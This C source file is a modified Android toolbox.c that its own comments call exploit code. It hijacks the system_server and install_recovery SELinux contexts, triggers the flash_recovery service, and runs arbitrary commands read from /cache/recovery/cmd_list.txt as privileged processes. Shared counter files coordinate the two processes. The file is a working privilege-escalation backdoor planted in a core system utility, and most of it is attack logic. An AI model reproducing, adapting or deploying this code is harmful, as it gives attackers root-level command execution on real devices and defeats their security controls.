/* begin default toolbox.c headers, 3 total */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/* end default toolbox.c headers, 3 total */

//headers added to support exploit
#include<sys/wait.h>
#include <unistd.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>

#include "shared.h"


//my function definitions
int system_server_loop();
//char * command_line, const char * context
void eXecCmd(char *, const char *);

//toolbox.c function declarations
int main(int, char **);

static int toolbox_main(int argc, char **argv)
{
    // "toolbox foo ..." is equivalent to "foo ..."
    if (argc > 1) {
        return main(argc - 1, argv + 1);
    } else {
        printf("Toolbox!\n");
        return 0;
    }
}

#define TOOL(name) int name##_main(int, char**);
#include "tools.h"
#undef TOOL

static struct 
{
    const char *name;
    int (*func)(int, char**);
} tools[] = {
    { "toolbox", toolbox_main },
#define TOOL(name) { #name, name##_main },
#include "tools.h"
#undef TOOL
    { 0, 0 },
};

int main(int argc, char **argv)
{
    int i;
    char *name = argv[0];


	//saves current context
	char *currcon;
	//we use this to fork < system_server into it's own loop    
    pid_t ss_cpid, ss_check_this_pid;


	// contexts
	const char *SERVER_CONTEXT = "u:r:system_server:s0";
	const char *INSTALL_CONTEXT = "u:r:install_recovery:s0";

	getcon(&currcon);
	LOGV("[+] toolbox running %s as uid: %d, gid: %d, context %s", argv[0], getuid(), getgid(), currcon);

														/* we will capture a root + system_server process, then fork it */
								if( !strcmp(SERVER_CONTEXT, currcon) && increment_value(0, RSF_TOOLBOX_RUN_ONCE) ) { /* I expect current value of 0, otherwise return false */
																			
																			/* if system_server context && increment did't return 0 we will be here */
														
											LOGV("[*] Forking system_server < install_recovery + system_server pid:%i",getpid());
    										ss_cpid = fork();
    										switch (ss_cpid) 
    										{
        										case -1: LOGV("Fork failed; ss_cpid == -1");
                 									break;
        										case 0: ss_check_this_pid = getpid();
        										
        											//send the spawned root+system_server thread into the system_server_loop() function
        											if(system_server_loop()){		}else{	exit(0);  }

       											//original thread will pass by to become install_recovery
		        							}        			

								
								LOGV("[*] toolbox property_set flash_recovery pid:%i",getpid());
								property_set("ctl.start", "flash_recovery");
								
								/* ONLY the first install_recovery will be hijacked, use the same file as system_server but this time set it to 2 */
								/* if current context == install_recovery AND we haven't already increment RSF_TOOLBOX_RUN_ONCE to be value of 2 */
								}else if (!strcmp(INSTALL_CONTEXT, currcon) && increment_value(1, RSF_TOOLBOX_RUN_ONCE) ) {	/* increment rejects if value not currently 1 */							
																			/* if install_recovery context && increment did't return 0 we will be here */
																LOGV("[*] -=-= EXPLOIT ACTIVE =-=- ");




		// when bridge has sen't cmd_list.txt and any supporting files for our cmd_list.txt this value will be 1 inside the file
		while(check_value(RSF_SENT_FILE_LIST) != 1) {usleep(200);}


	   char *    exec_trimmed_CmdLine; //char pointer to an unallocated char array used with system().
	   char *	 tmpStr; //char pointer to an unallocated char array used to test requested context. -$ system_server or -# install_recovery
	   
	   //while loop processes cmd_list.txt 2040 is probably 4 times overkill but let's not fail over a few bytes difference
		char line[2040];
		int iCntr=0;
		int ret=1;

			//open the file hardcoded below <DEBUG> hard coded
   			FILE *file_ir_cmds = fopen("/cache/recovery/cmd_list.txt","r");
   				if (file_ir_cmds == NULL) {
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), file_ir_cmds)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");

			ret = strncmp(tmpStr, "-#", 2);
			if ( ret == 0 ){
				//desired context, execute this line
				eXecCmd(exec_trimmed_CmdLine,INSTALL_CONTEXT);
			}

					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* please notice that i used increment_value here
																   instead of the set_value function */
					
						//wait for system_server to set the value 0 again
						while ( check_value(RSF_IREC_DONE) != 0 ) {
						usleep(200);} /* add delay so as not to cook the cpus */
		iCntr++;
		}
					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* careful, i used increment_value here not set_value */

	if(file_ir_cmds != NULL)				        
	fclose(file_ir_cmds);


		//signal bridge/till/farm that we are done now.	   
if ( increment_value(1, RSF_SENT_FILE_LIST) ) {}


} //END OF ELSE IF --- PRIV ELEVATION LOGIC


leave_hack:
if(currcon != NULL)
	free(currcon);    


    
//toolbox 5.11 r2 default main() code
    if((argc > 1) && (argv[1][0] == '@')) {
        name = argv[1] + 1;
        argc--;
        argv++;
    } else {
        char *cmd = strrchr(argv[0], '/');
        if (cmd)
            name = cmd + 1;
    }

    for(i = 0; tools[i].name; i++){
        if(!strcmp(tools[i].name, name)){
            return tools[i].func(argc, argv);
        }
    }

    printf("%s: no such tool\n", argv[0]);
    return -1;
}

//folowing code is 100% exploit code, not part of toolbox.c
int system_server_loop(){
						/* wait for install_recovery to process a line 
						   then system_server will process a line, 
						   then install_recovery again and so on */
							while ( check_value(RSF_IREC_DONE) != 1 ) {
							usleep(200);} /* add delay so as not to cook the cpus */

	const char *SERVER_CONTEXT = "u:r:system_server:s0";
	
	   char *    exec_trimmed_CmdLine; //command line trimmed and ready to execute
	   char *	 tmpStr; //used to test the desired context; system_server vs install_recovery
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;
		int ret=1; //true is false basically.. 

			//open the file
   			FILE *fpBlock = fopen("/cache/recovery/cmd_list.txt","r");
   				if (fpBlock == NULL) {
   					LOGV("error opening cmd_list.txt in system_server loop");
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), fpBlock)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");
			
			//test if applies to system_server
			int ret = strncmp(tmpStr, "-$", 2);
			if ( ret == 0 ){
				//this is the desired context, execute this line
				eXecCmd(exec_trimmed_CmdLine,SERVER_CONTEXT);
			}


					//signal install_recovery to continue
					if ( set_value(0, RSF_IREC_DONE) ) {}
					
					
						//wait for install_recovery to set the value 1 again
						while ( check_value(RSF_IREC_DONE) != 1 ) {
						usleep(200);} /* add delay so as not to cook the cpus */

			iCntr++;
	
		}
					//signal install_recovery to continue, must use set_value here not increment_value
					if ( set_value(0, RSF_IREC_DONE) ) {}
		

	if(fpBlock != NULL)				        
	fclose(fpBlock);
		
		
		
	return 0;
}
//issue console command using system() but also reattempt using execv() upon failure, just because
void eXecCmd(char *command_line, const char *context) {
//if system() return was nonzero there was an error, let's try execv() instead
				if( system(command_line) ) {
				LOGV("<%s> system() call failed for: %s .. attempting execv()",context, command_line);
				
   //execv(<binary>, <command>)
   char *		bin_path_extract;
   char *		cmd_line_extract;
   

				//parse the command line <binary path up to the space> <remainder is the arguments>
				bin_path_extract = strtok(command_line," ");
				cmd_line_extract = strtok(NULL,"\n");

				//process id for storing and testing our forked proc
				pid_t ec_pid, check_this_pid;
    		    ec_pid = fork(); /* this proc dies after the execv call */
    						switch (ec_pid) /* send child proc into ss loop */
    						{
        							case -1: //LOGV("Fork failed; ec_pid == -1");
                 						break;
        							case 0: check_this_pid = getpid();
        								
        								//make the execv() call
										char *exe_args[] = { bin_path_extract, cmd_line_extract, NULL};
										execv( exe_args[0], exe_args );

        								default: /* wait for process to finish before continuing */
        								waitpid(ec_pid, NULL, 0);
							}        			

				}else{
					LOGV("Toolbox <%s> successfully executed %s",context,command_line);
        		}			
      			

}
